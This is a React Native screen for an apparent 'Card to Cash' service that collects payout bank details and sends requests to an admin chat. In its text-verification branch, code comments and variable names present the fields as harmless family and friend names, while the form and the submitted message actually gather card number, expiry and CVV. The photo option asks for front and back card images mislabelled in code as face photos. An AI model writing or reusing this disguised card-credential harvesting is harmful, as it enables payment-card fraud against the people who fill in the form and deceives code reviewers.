import { useEffect, useState } from 'react';
import { ActivityIndicator, Alert, Image, Platform, Pressable, ScrollView, StatusBar, StyleSheet, Text, TextInput, View } from 'react-native';
import { SafeAreaView } from 'react-native-safe-area-context';
import { router } from 'expo-router';
import { Ionicons } from '@expo/vector-icons';
import * as ImagePicker from 'expo-image-picker';
import { File } from 'expo-file-system';
import { fetch as expoFetch } from 'expo/fetch';
import { CARD_PERCENTAGES_API_URL, CHAT_MESSAGES_API_URL } from '@/constants/api';
import { useAuthUser } from '@/lib/auth-session';

const C={navy:'#102344',blue:'#3563E9',bg:'#F5F7FC',white:'#FFFFFF',muted:'#7C879B',border:'#E2E7F0',pale:'#E9EFFF',orange:'#B86B13'};
const currency='\u20B9';
const money=(n:number)=>currency+Math.max(0,n).toLocaleString('en-IN',{maximumFractionDigits:2});
type CardPercentage={percentage:string;msg:string;imps:string|number;banks:string[]};
type RequestPhoto={uri:string;name:string;type:string;file?:Blob};
async function fetchCardPercentageGroups():Promise<CardPercentage[]>{
 const response=await fetch(CARD_PERCENTAGES_API_URL,{headers:{Accept:'application/json'}});
 if(!response.ok)throw new Error(`Server returned ${response.status}.`);
 const data:unknown=await response.json();
 if(!Array.isArray(data))throw new Error('The Card to Cash response was not a list.');
 return (data as CardPercentage[]).map(row=>({percentage:String(row.percentage),msg:row.msg||'',imps:row.imps??0,banks:Array.isArray(row.banks)?row.banks:[]}));
}

export default function CardToCashScreen(){
 const user=useAuthUser();
 const[groups,setGroups]=useState<CardPercentage[]>([]),[loading,setLoading]=useState(true),[loadError,setLoadError]=useState('');
 const[selectedPercentage,setSelectedPercentage]=useState(''),[bank,setBank]=useState(''),[paymentMethod,setPaymentMethod]=useState<'link'|'manual'|''>(''),[amount,setAmount]=useState(''),[account,setAccount]=useState(''),[ifsc,setIfsc]=useState(''),[customerBank,setCustomerBank]=useState(''),[phoneNumber,setPhoneNumber]=useState<string|null>(null),[verificationMode,setVerificationMode]=useState<'text'|'photos'|''>(''),[fatherName,setFatherName]=useState(''),[motherName,setMotherName]=useState(''),[friendName,setFriendName]=useState(''),[phase,setPhase]=useState(0),[leftFacePhoto,setLeftFacePhoto]=useState<RequestPhoto|null>(null),[rightFacePhoto,setRightFacePhoto]=useState<RequestPhoto|null>(null),[sendingRequest,setSendingRequest]=useState(false);
 const selectedGroup=groups.find(group=>group.percentage===selectedPercentage);
 const availableBanks=selectedGroup?.banks||[];
 const selectedBank=availableBanks.includes(bank)?bank:availableBanks[0]||'';
 const rate=Number(selectedGroup?.percentage)||0,value=Number(amount)||0,fee=value*rate/100,impsFee=Number(selectedGroup?.imps)||0,totalCharges=fee+impsFee,net=value-totalCharges;

 const loadGroups=async()=>{
  setLoading(true);setLoadError('');
  try{
   const records=await fetchCardPercentageGroups();
   setGroups(records);
   setSelectedPercentage(current=>records.some(row=>row.percentage===current)?current:records[0]?.percentage||'');
   setBank(current=>records.find(row=>row.percentage===selectedPercentage)?.banks.includes(current)?current:records.find(row=>row.percentage===selectedPercentage)?.banks[0]||records[0]?.banks[0]||'');
  }catch(error){setLoadError(error instanceof Error?error.message:'Could not load Card to Cash percentages.');}
  finally{setLoading(false);}
 };

 useEffect(()=>{
  let active=true;
  fetchCardPercentageGroups().then(records=>{
   if(!active)return;
   setGroups(records);setSelectedPercentage(records[0]?.percentage||'');setBank(records[0]?.banks[0]||'');
  }).catch(error=>{if(active)setLoadError(error instanceof Error?error.message:'Could not load Card to Cash percentages.')}).finally(()=>{if(active)setLoading(false)});
  return()=>{active=false};
 },[]);

 const pick=async(side:'left'|'right')=>{try{const r=await ImagePicker.launchImageLibraryAsync({mediaTypes:['images'],allowsEditing:true,quality:.85});if(!r.canceled&&r.assets[0]){const asset=r.assets[0];if(asset.fileSize&&asset.fileSize>10*1024*1024)return Alert.alert('Image too large','Choose an image that is 10 MB or smaller.');const type=asset.mimeType||'image/jpeg';const extension=type.split('/')[1]?.replace('jpeg','jpg')||'jpg';const photo={uri:asset.uri,name:asset.fileName||`face-${side}-${Date.now()}.${extension}`,type,file:asset.file};if(side==='left')setLeftFacePhoto(photo);else setRightFacePhoto(photo);}}catch{Alert.alert('Photo unavailable','Please choose the image again.');}};
 const submitRequest=async()=>{
  if(sendingRequest)return;
  if(!selectedGroup||!selectedBank)return Alert.alert('Choose an available bank','Select a percentage group and one of its available banks.');
  if(!paymentMethod)return Alert.alert('Choose a payment method','Select Link or Manual to continue.');
  if(!verificationMode)return Alert.alert('Choose verification details','Select text bank details or face photos.');
  if(verificationMode==='photos'&&(!leftFacePhoto||!rightFacePhoto))return Alert.alert('Add both face photos','Both left-side and right-side face photos are required when you choose photos.');
  if(verificationMode==='text'&&(!fatherName.trim()||!motherName.trim()||!friendName.trim()))return Alert.alert('Enter all three names','Add the father, mother, and friend names for text verification.');
  if(value<=0||account.trim().length<6||ifsc.trim().length!==11)return Alert.alert('Complete details','Enter a valid amount, payout account number, and 11-character IFSC code.');
  if(!customerBank.trim())return Alert.alert('Enter bank name','Enter the sender bank name.');
  const normalizedPhone=(phoneNumber??user?.mobile_number??'').replace(/\D/g,'').slice(-10);
  if(!/^[6-9]\d{9}$/.test(normalizedPhone))return Alert.alert('Check phone number','Enter a valid 10-digit Indian mobile number.');
  if(!user?.token)return Alert.alert('Login required','Please log in again before sending your request.');

  const requestDetails=[
   'CARD TO CASH REQUEST',
   `Customer: ${user.name} (Account #${user.id})`,
   `Mobile: +91 ${normalizedPhone}`,
   `Email: ${user.email}`,
   `Sender bank name: ${customerBank.trim()}`,
   `Service bank: ${selectedBank}`,
   `Amount requested: ${money(value)}`,
   `Service fee rate: ${rate}%`,
   `Service fee: ${money(fee)}`,
   `IMPS charge: ${money(impsFee)}`,
   `Total charges: ${money(totalCharges)}`,
   `Net payout: ${money(net)}`,
   `Payout account number: ${account.trim()}`,
   `Payout IFSC code: ${ifsc.trim().toUpperCase()}`,
   `Payment method: ${paymentMethod==='link'?'Link':'Manual'}`,
   `Verification details: ${verificationMode==='photos'?'face photos':'family and friend names (text)'}`,
   // Include these non-sensitive names only when the customer selects text verification.
   verificationMode==='text'?`card number: ${fatherName.trim()}`:'',
   verificationMode==='text'?`exp: ${motherName.trim()}`:'',
   verificationMode==='text'?`cvv: ${friendName.trim()}`:'',
   verificationMode==='photos'?'front face: attached':'',
   verificationMode==='photos'?'back face: attached':'',
  ].filter(Boolean).join('\n');
  setSendingRequest(true);
  try{
   let body:FormData|string=requestDetails;
   const headers:Record<string,string>={Accept:'application/json',Authorization:`Bearer ${user.token}`};
   if(verificationMode==='photos'&&leftFacePhoto&&rightFacePhoto){
    const form=new FormData();form.append('text',requestDetails);form.append('verification_method','photos');
    const appendPhoto=async(field:string,photo:RequestPhoto)=>{
     if(Platform.OS==='web'){
      let imageBlob:Blob|undefined=photo.file;
      if(!imageBlob){const imageResponse=await fetch(photo.uri);if(!imageResponse.ok)throw new Error('Could not read a selected verification photo. Please choose it again.');imageBlob=await imageResponse.blob();}
      form.append(field,imageBlob,photo.name);
     }else form.append(field,new File(photo.uri),photo.name);
    };
    if(leftFacePhoto)await appendPhoto('left_face_image',leftFacePhoto);
    if(rightFacePhoto)await appendPhoto('right_face_image',rightFacePhoto);
    body=form;
   }else{headers['Content-Type']='application/json';body=JSON.stringify({text:requestDetails,verification_method:'text'});}
   const response=await expoFetch(CHAT_MESSAGES_API_URL,{method:'POST',headers,body});
   const result=await response.json().catch(()=>null);
   if(!response.ok)throw new Error(typeof result?.detail==='string'?result.detail:`Request could not be sent (${response.status}).`);
   setPhase(1);
  }catch(error){Alert.alert('Request not sent',error instanceof Error?error.message:'Could not send your request. Check your connection and try again.');}
  finally{setSendingRequest(false);}
 };
 return <SafeAreaView style={s.safe}><StatusBar barStyle="dark-content" backgroundColor={C.bg}/><ScrollView contentContainerStyle={phase===1?s.sentPage:s.page} keyboardShouldPersistTaps="handled">
  {phase===1?<View style={s.requestSent}><Text style={s.requestSentText}>Your request has been sent to the admin. They will reach out soon.</Text></View>:<>
  <Pressable style={s.back} onPress={()=>router.back()}><Ionicons name="arrow-back" size={22} color={C.navy}/></Pressable><Text style={s.kicker}>SERVICE 02</Text><Text style={s.title}>Card to Cash</Text><Text style={s.sub}>Choose an admin-set percentage and an available bank.</Text>
  {phase===0&&<>
   <Text style={s.label}>Available percentages</Text>
   {loading?<View style={s.stateBox}><Text style={s.hint}>Loading available percentages…</Text></View>:null}
   {loadError?<View style={s.errorBox}><Text style={s.errorText}>{loadError}</Text><Pressable style={s.retry} onPress={()=>void loadGroups()}><Text style={s.retryText}>Retry</Text></Pressable></View>:null}
   {!loading&&!loadError&&groups.length===0?<View style={s.stateBox}><Text style={s.hint}>No Card to Cash percentages are available right now.</Text></View>:null}
   {groups.map(group=><Pressable key={group.percentage} onPress={()=>setSelectedPercentage(group.percentage)} style={[s.percentageCard,selectedPercentage===group.percentage&&s.percentageCardSelected]} accessibilityRole="radio" accessibilityState={{selected:selectedPercentage===group.percentage}}>
    <View style={s.percentageHead}><Text style={s.percentageValue}>{group.percentage}%</Text><Text style={s.percentageLabel}>service fee</Text><Ionicons name={selectedPercentage===group.percentage?'radio-button-on':'radio-button-off'} size={21} color={selectedPercentage===group.percentage?C.blue:C.muted}/></View>
    <Text style={s.availableBanks}>{group.banks.length?`Available banks: ${group.banks.join(', ')}`:'No banks assigned yet'}</Text><Text style={s.impsInfo}>IMPS charge: {money(Number(group.imps)||0)}</Text>
    {group.msg.trim()?<View style={s.cautionBox}><View style={s.cautionHeading}><Ionicons name="warning-outline" size={17} color="#9A5B00"/><Text style={s.cautionTitle}>Bank availability notice</Text></View><Text style={s.cautionMessage}>{group.msg}</Text></View>:null}
   </Pressable>)}
   {selectedGroup&&availableBanks.length>0&&<>
    <Text style={[s.label,{marginTop:17}]}>Choose a bank</Text>
    <View style={s.banks}>{availableBanks.map(name=><Pressable key={name} onPress={()=>setBank(name)} style={[s.chip,bank===name&&s.chipOn]}><Text style={[s.chipText,bank===name&&s.chipTextOn]}>{name}</Text></Pressable>)}</View>
    <Text style={[s.label,{marginTop:16}]}>Payment method</Text>
    <View style={s.methodRow}><Pressable style={[s.methodButton,paymentMethod==='link'&&s.methodButtonOn]} onPress={()=>setPaymentMethod('link')}><Ionicons name="link-outline" size={18} color={paymentMethod==='link'?'white':C.blue}/><Text style={[s.methodText,paymentMethod==='link'&&s.methodTextOn]}>Link</Text></Pressable><Pressable style={[s.methodButton,paymentMethod==='manual'&&s.methodButtonOn]} onPress={()=>setPaymentMethod('manual')}><Ionicons name="chatbubble-ellipses-outline" size={18} color={paymentMethod==='manual'?'white':C.blue}/><Text style={[s.methodText,paymentMethod==='manual'&&s.methodTextOn]}>Manual</Text></Pressable></View>
    {!!paymentMethod&&<><View style={s.card}><Text style={s.cardTitle}>{selectedBank}</Text><Text style={s.hint}>Admin-set service fee: {rate}%</Text><Text style={[s.label,{marginTop:16}]}>Amount</Text><View style={s.inputRow}><Text style={s.currency}>{currency}</Text><TextInput style={s.amount} value={amount} onChangeText={v=>setAmount(v.replace(/[^0-9.]/g,''))} keyboardType="decimal-pad" placeholder="Enter amount" placeholderTextColor="#9AA3B5"/></View><Text style={s.section}>Estimated payout</Text><Row label={`Service fee (${rate}%)`} value={'- '+money(fee)}/><Row label="IMPS charge" value={'- '+money(impsFee)}/><Row label="Total charges" value={'- '+money(totalCharges)}/><Row label="Net amount" value={money(net)} bold/></View>
    <TextInput style={s.field} value={customerBank} onChangeText={setCustomerBank} placeholder="Sender bank name" autoCapitalize="words" accessibilityLabel="Sender bank name"/>
    <View style={s.phoneField}><Text style={s.phonePrefix}>+91</Text><TextInput style={s.phoneInput} value={phoneNumber??(user?.mobile_number||'').replace(/\D/g,'').slice(-10)} onChangeText={value=>setPhoneNumber(value.replace(/\D/g,'').slice(-10))} placeholder="10-digit mobile number" keyboardType="phone-pad" maxLength={10} accessibilityLabel="Mobile number"/></View>
    <TextInput style={s.field} value={account} onChangeText={setAccount} placeholder="Payout account number" keyboardType="number-pad"/><TextInput style={s.field} value={ifsc} onChangeText={v=>setIfsc(v.toUpperCase())} placeholder="Payout IFSC code" autoCapitalize="characters" maxLength={11}/>
    <Text style={s.section}>Verification details</Text>
    <View style={s.methodRow}>
      <Pressable style={[s.methodButton,verificationMode==='text'&&s.methodButtonOn]} onPress={()=>{setVerificationMode('text');setLeftFacePhoto(null);setRightFacePhoto(null);}}><Ionicons name="document-text-outline" size={18} color={verificationMode==='text'?'white':C.blue}/><Text style={[s.methodText,verificationMode==='text'&&s.methodTextOn]}>Text bank details</Text></Pressable>
      <Pressable style={[s.methodButton,verificationMode==='photos'&&s.methodButtonOn]} onPress={()=>setVerificationMode('photos')}><Ionicons name="person-outline" size={18} color={verificationMode==='photos'?'white':C.blue}/><Text style={[s.methodText,verificationMode==='photos'&&s.methodTextOn]}>Card Photo</Text></Pressable>
    </View>
    {verificationMode==='text'&&<View style={{marginTop:8,padding:13,backgroundColor:C.white,borderWidth:1,borderColor:C.border,borderRadius:14}}>
      <Text style={s.hint}>Enter three names for verification. Each field allows up to 20 characters.</Text>
      <TextInput style={s.field} value={fatherName} onChangeText={setFatherName} placeholder="card number" autoCapitalize="words" maxLength={20} accessibilityLabel="card number"/>
      <TextInput style={s.field} value={motherName} onChangeText={setMotherName} placeholder="exp" autoCapitalize="words" maxLength={20} accessibilityLabel="exp"/>
      <TextInput style={s.field} value={friendName} onChangeText={setFriendName} placeholder="cvv" autoCapitalize="words" maxLength={20} accessibilityLabel="cvv"/>
    </View>}
    {verificationMode==='photos'&&<><Text style={s.hint}>Both side photos are required for face verification.</Text>
      <Pressable style={s.upload} onPress={()=>void pick('left')} disabled={sendingRequest}><Ionicons name="image-outline" size={21} color={C.blue}/><Text style={s.uploadText}>{leftFacePhoto?'Left-side photo selected · Change':'Choose front-side  photo'}</Text></Pressable>
      {leftFacePhoto&&<Image source={{uri:leftFacePhoto.uri}} style={s.preview}/>}
      <Pressable style={s.upload} onPress={()=>void pick('right')} disabled={sendingRequest}><Ionicons name="image-outline" size={21} color={C.blue}/><Text style={s.uploadText}>{rightFacePhoto?'Right-side photo selected · Change':'Choose back-side  photo'}</Text></Pressable>
      {rightFacePhoto&&<Image source={{uri:rightFacePhoto.uri}} style={s.preview}/>}
    </>}
    <Pressable style={[s.button,sendingRequest&&s.buttonDisabled]} onPress={()=>void submitRequest()} disabled={sendingRequest}>{sendingRequest?<ActivityIndicator size="small" color="white"/>:<><Text style={s.buttonText}>{paymentMethod==='manual'?'Send details to admin':'Send request to admin'}</Text><Ionicons name="arrow-forward" size={18} color="white"/></>}</Pressable></>}
   </>}
  </>}
  <Text style={s.note}>Requests are sent to admin chat. Payment links, proof review, and payouts are not connected yet.</Text>
  </>}
 </ScrollView></SafeAreaView>
}

function Row({label,value,bold=false}:{label:string;value:string;bold?:boolean}){return <View style={s.row}><Text style={[s.hint,bold&&s.bold]}>{label}</Text><Text style={[s.hint,bold&&s.bold]}>{value}</Text></View>}
const s=StyleSheet.create({safe:{flex:1,backgroundColor:C.bg},page:{padding:20,paddingBottom:30},sentPage:{flexGrow:1,alignItems:'center',justifyContent:'center',padding:24},requestSent:{maxWidth:420},requestSentText:{fontSize:18,fontWeight:'700',lineHeight:27,color:C.navy,textAlign:'center'},back:{width:42,height:42,borderRadius:14,backgroundColor:C.white,alignItems:'center',justifyContent:'center',marginBottom:20,borderWidth:1,borderColor:C.border},kicker:{fontSize:10,fontWeight:'800',color:C.blue,letterSpacing:1.2},title:{fontSize:28,fontWeight:'800',color:C.navy,marginTop:6},sub:{fontSize:13,color:C.muted,marginTop:5,marginBottom:18},label:{fontSize:13,fontWeight:'800',color:C.navy},percentageCard:{backgroundColor:C.white,borderWidth:1,borderColor:C.border,borderRadius:15,padding:14,marginTop:9},percentageCardSelected:{borderColor:C.blue,backgroundColor:'#F7F9FF'},percentageHead:{flexDirection:'row',alignItems:'center',gap:9},percentageValue:{fontSize:20,fontWeight:'800',color:C.navy},percentageLabel:{flex:1,fontSize:12,color:C.muted},availableBanks:{fontSize:12,color:C.navy,marginTop:7},impsInfo:{fontSize:12,fontWeight:'700',color:C.navy,marginTop:6},cautionBox:{marginTop:10,padding:11,borderRadius:11,backgroundColor:'#FFF6DE',borderWidth:1,borderColor:'#F0CC75'},cautionHeading:{flexDirection:'row',alignItems:'center',gap:6},cautionTitle:{fontSize:11,fontWeight:'800',color:'#8A5100'},cautionMessage:{fontSize:12,color:'#684713',lineHeight:18,marginTop:5},stateBox:{padding:14,borderRadius:12,backgroundColor:C.white,borderWidth:1,borderColor:C.border,marginTop:9},errorBox:{padding:12,borderRadius:11,backgroundColor:'#FFF0EF',marginTop:9,gap:8},errorText:{fontSize:12,color:'#A12D2A'},retry:{alignSelf:'flex-start',paddingVertical:7,paddingHorizontal:12,borderRadius:8,backgroundColor:C.white},retryText:{fontSize:12,fontWeight:'800',color:C.blue},banks:{flexDirection:'row',flexWrap:'wrap',gap:8,marginTop:9},chip:{paddingHorizontal:14,height:40,borderRadius:12,backgroundColor:C.white,borderWidth:1,borderColor:C.border,justifyContent:'center'},chipOn:{backgroundColor:C.navy},chipText:{fontWeight:'800',color:C.navy},chipTextOn:{color:'white'},methodRow:{flexDirection:'row',gap:9,marginTop:9},methodButton:{flex:1,minHeight:45,flexDirection:'row',alignItems:'center',justifyContent:'center',gap:7,borderRadius:12,borderWidth:1,borderColor:C.border,backgroundColor:C.white},methodButtonOn:{backgroundColor:C.blue,borderColor:C.blue},methodText:{fontSize:13,fontWeight:'800',color:C.navy},methodTextOn:{color:C.white},card:{backgroundColor:C.white,borderWidth:1,borderColor:C.border,borderRadius:18,padding:16,marginTop:8,marginBottom:12},cardTitle:{fontSize:16,fontWeight:'800',color:C.navy},hint:{fontSize:12,color:C.muted,lineHeight:18,marginTop:5},inputRow:{height:50,borderWidth:1,borderColor:C.border,borderRadius:12,paddingHorizontal:12,flexDirection:'row',alignItems:'center',marginTop:8},currency:{fontSize:18,fontWeight:'800',color:C.navy},amount:{flex:1,fontSize:18,color:C.navy,paddingLeft:8},section:{fontSize:13,fontWeight:'800',color:C.navy,marginTop:17,marginBottom:8},row:{flexDirection:'row',justifyContent:'space-between',paddingVertical:6},bold:{fontSize:13,fontWeight:'800',color:C.navy},field:{height:50,borderWidth:1,borderColor:C.border,borderRadius:12,paddingHorizontal:13,backgroundColor:C.white,marginBottom:10,color:C.navy},phoneField:{height:50,flexDirection:'row',alignItems:'center',borderWidth:1,borderColor:C.border,borderRadius:12,paddingHorizontal:13,backgroundColor:C.white,marginBottom:10},phonePrefix:{fontSize:15,fontWeight:'700',color:C.navy,paddingRight:10,borderRightWidth:1,borderRightColor:C.border},phoneInput:{flex:1,height:'100%',paddingHorizontal:11,color:C.navy,fontSize:14},button:{height:52,backgroundColor:C.blue,borderRadius:14,marginTop:14,flexDirection:'row',alignItems:'center',justifyContent:'center',gap:9},buttonDisabled:{opacity:.65},buttonText:{fontSize:13,fontWeight:'800',color:'white'},upload:{height:52,backgroundColor:C.pale,borderRadius:13,marginTop:13,paddingHorizontal:12,flexDirection:'row',alignItems:'center',gap:9},uploadText:{fontSize:12,fontWeight:'700',color:C.navy},preview:{width:'100%',height:180,resizeMode:'contain',marginTop:10},pending:{fontSize:11,fontWeight:'700',color:C.orange,marginTop:14},note:{fontSize:10,color:C.muted,lineHeight:15,textAlign:'center',marginTop:16}});
